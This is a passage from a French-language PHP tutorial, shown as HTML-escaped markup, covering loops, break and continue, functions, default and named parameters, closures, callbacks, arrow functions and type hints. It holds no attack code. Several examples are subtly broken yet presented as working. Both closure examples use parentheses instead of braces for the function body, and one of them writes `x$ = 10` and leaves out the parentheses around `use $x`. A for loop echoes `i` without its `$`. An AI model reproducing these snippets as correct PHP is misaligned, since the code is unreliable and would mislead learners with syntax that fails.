&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$number&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$number&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'value : '&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$number&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nv"&gt;$number&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Ici le bloc de code sera exécuté 9 fois.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#la-boucle-do-while"&gt;
  &lt;/a&gt;
  La boucle “do while”
&lt;/h3&gt;

&lt;p&gt;Essentiellement le même principe que la boucle “while” mais dans ce cas-ci, le bloc de code va toujours s’exécuter au moins une fois. La condition étant testé seulement à la fin du bloc de code.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$number&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'value : '&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$number&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nv"&gt;$number&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$number&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#la-boucle-for"&gt;
  &lt;/a&gt;
  La boucle “for”
&lt;/h3&gt;

&lt;p&gt;Permet d’exécuter un bloc de code un nombre de fois définit par une condition.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;"i value = "&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Le paramètre se divise en trois sections, le première étant la définition du compteur (i = 0). Ensuite la condition à respecter pour exécuter le bloc de code ($i &amp;lt; 20)  et enfin le code à exécuter à chaque itération ($i++)&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#la-boucle-foreach"&gt;
  &lt;/a&gt;
  La boucle “foreach”
&lt;/h3&gt;

&lt;p&gt;La fonction foreach permet d’exécuter un bloc de code pour chaque élément d’un tableau.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$names&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'Mike'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'Shawn'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'John'&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

&lt;span class="k"&gt;foreach&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$names&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="nv"&gt;$name&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; 
   &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Hello '&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$name&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Le premier paramètre c’est le nom du tableau à parcourir, le second paramètre représente la référence à l’élément en cours.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#break-et-continue"&gt;
  &lt;/a&gt;
  Break et Continue
&lt;/h3&gt;

&lt;p&gt;Les instructions break et continue permettent de modifier la boucle&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;continue&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="s1"&gt;'&amp;lt;br&amp;gt;'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Cette boucle va imprimer la valeur de $i, seulement lorsque la valeur sera impaire.&lt;/p&gt;

&lt;p&gt;Si la valeur est paire ($i % 2 === 0). Alors on demande à la boucle de faire un &lt;strong&gt;continue&lt;/strong&gt; avec la prochaine valeur.&lt;/p&gt;

&lt;p&gt;Il est possible de sortir de la boucle à tout moment avec l’instruction &lt;strong&gt;break&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;10000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="s1"&gt;'&amp;lt;br&amp;gt;'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Ici la boucle va s’arrêter lorsque $i aura 10 comme valeur&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#les-fonctions"&gt;
  &lt;/a&gt;
  Les fonctions
&lt;/h1&gt;

&lt;p&gt;En PHP il existe plusieurs fonctions déjà pré-définit. Il est également possible de créer nos propres fonctions. &lt;/p&gt;

&lt;p&gt;Les fonctions permettent d’éviter de répéter notre code plusieurs fois. Elles permettent également de diviser notre application en petit morceau plus facile à maintenir.&lt;/p&gt;

&lt;p&gt;La syntaxe pour créer une fonction est assez simple&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;hello&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Hello World'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Ici nous utilisons le mot-clé “function” suivit du nom de notre fonction.&lt;/p&gt;

&lt;p&gt;Une fois notre fonction créée, il est possible de lancer son exécution&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nf"&gt;hello&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Il est possible d’inclure un ou des paramètres notre fonction&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;hello&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$firstName&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$lastName&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Hello'&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$firstName&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="s1"&gt;' '&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$lastName&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Le lancement de la fonction devra inclure les paramètres dans l’ordre qu’ils ont été déclarés&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nf"&gt;hello&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'Mike'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'Taylor'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Une valeur par défaut peut-être attribué à un paramètre ce qui du coup rendra se paramètre optionnel lors de l’appel de la fonction.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;hello&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$firstName&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$lastName&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'none'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Hello'&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$firstName&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="s1"&gt;' '&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$lastName&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nf"&gt;hello&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'Mike'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="c1"&gt;// Mike none&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;À noter que les paramètres avec une valeur par défaut doivent absolument être définit en dernier ordre.&lt;/p&gt;

&lt;p&gt;Depuis la version 8 de PHP il est possible de lancer une fonction en nommant les paramètres. L’appel est plus clair et l’ordre des paramètres n’a pas à être respecté.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nf"&gt;hello&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;lastName&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'Taylor'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;firstName&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'Mike'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#linstruction-return"&gt;
  &lt;/a&gt;
  L’instruction Return
&lt;/h3&gt;

&lt;p&gt;Permet de retourner une valeur lorsque l’on l'appel la fonction.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;fullName&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$firstName&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$lastName&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$firstName&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="s1"&gt;' '&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$lastName&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nf"&gt;fullName&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'John'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'Doe'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Ici la fonction retourne une string concaténé avec prénom et nom&lt;/p&gt;

&lt;p&gt;La fonction echo va afficher sur la page web la valeur retournée par la fonction fullName()&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#fonctions-anonymes-closure"&gt;
  &lt;/a&gt;
  Fonctions anonymes (closure)
&lt;/h3&gt;

&lt;p&gt;Permet la création de fonctions sans préciser leur nom. Voici un exemple :&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$sum&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$a&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$sum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Les fonctions anonymes se terminent par un semi colon ;  Et elles ne peuvent pas accéder aux variables du contexte parent.&lt;/p&gt;

&lt;p&gt;Il est possible de passer une variable depuis le contexte parent avec l’instruction &lt;strong&gt;use&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="nv"&gt;$sum&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;use&lt;/span&gt; &lt;span class="nv"&gt;$x&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="kt"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$x&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nv"&gt;$a&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$sum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="c1"&gt;// 35&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#callback-functions"&gt;
  &lt;/a&gt;
  Callback functions
&lt;/h3&gt;

&lt;p&gt;Les fonctions Callback sont des fonctions anonymes passé comme paramètre. Voici un exemple&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$products&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'iPhone 12'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'iPhone 13'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'iPad'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'iWatch'&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

&lt;span class="nv"&gt;$filtered_products&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;array_filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$products&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$product&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nf"&gt;str_contains&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$product&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'Phone'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;});&lt;/span&gt;

&lt;span class="nb"&gt;print_r&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$filtered_products&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="c1"&gt;// Array ( [0] =&amp;gt; iPhone 12 [1] =&amp;gt; iPhone 13 )&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Ici la fonction array_filter() possède une fonction anonyme comme deuxième paramètre. &lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#arrow-functions"&gt;
  &lt;/a&gt;
  Arrow functions
&lt;/h3&gt;

&lt;p&gt;Permet l’utilisation d’une syntaxe raccourci:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$products&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'iPhone 12'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'iPhone 13'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'iPad'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'iWatch'&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

&lt;span class="nv"&gt;$filtered_products&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;array_filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$products&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;fn&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$product&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nf"&gt;str_contains&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$product&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'Phone'&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;

&lt;span class="nb"&gt;print_r&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$filtered_products&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;À noter que pour le moment, les Arrow fonctions permettent l’exécution de seulement une expression. Les Arrow function sont exécuté dans le contexte en cours donc peuvent utiliser les variables sans à avoir à utiliser l’instruction &lt;strong&gt;use&lt;/strong&gt;.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#fonction-type-hint"&gt;
  &lt;/a&gt;
  Fonction Type Hint
&lt;/h3&gt;

&lt;p&gt;À noter que les fonctions peuvent être typé (string, int, etc.). Il est possible de définir un type pour chacun des paramètres et un type pour la valeur de retour de la fonction.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;display&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="nv"&gt;$first&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="nv"&gt;$last&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$first&lt;/span&gt;&lt;span class="s2"&gt; &lt;/span&gt;&lt;span class="nv"&gt;$last&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Ici les paramètres $first et $last devront être de type string ainsi que le valeur de retour.&lt;/p&gt;

&lt;p&gt;Il existe plusieurs autres trucs à savoir sur les fonctions typé, nous y reviendrons un peu plus tard.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#strict-type"&gt;
  &lt;/a&gt;
  Strict Type
&lt;/h3&gt;

&lt;p&gt;Voici un exemple d’une fonction avec type&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nv"&gt;$a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$a&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nf"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'10'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="c1"&gt;// 30&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



